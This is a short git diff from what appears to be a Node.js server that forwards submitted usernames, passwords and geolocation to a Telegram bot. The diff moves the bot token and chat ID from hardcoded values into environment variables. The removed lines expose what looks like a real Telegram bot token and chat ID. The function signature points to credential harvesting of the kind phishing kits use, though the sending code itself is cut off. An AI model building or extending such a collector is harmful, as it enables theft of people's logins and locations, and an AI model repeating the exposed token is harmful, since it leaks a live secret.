@@ -11,8 +11,8 @@ const port = process.env.PORT || 3000;
 app.use(bodyParser.json());
 
 // 🔐 Replace with your Telegram bot token and chat ID
-const TELEGRAM_TOKEN = '7415933237:AAH1aPVfs-4S41LEMOzkS9_WVRdq6WAiN80';
-const CHAT_ID = '393941169';
+const TELEGRAM_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
 function sendToTelegram(username, password, lat, lon) {
   const message = `📥 New Data Received:
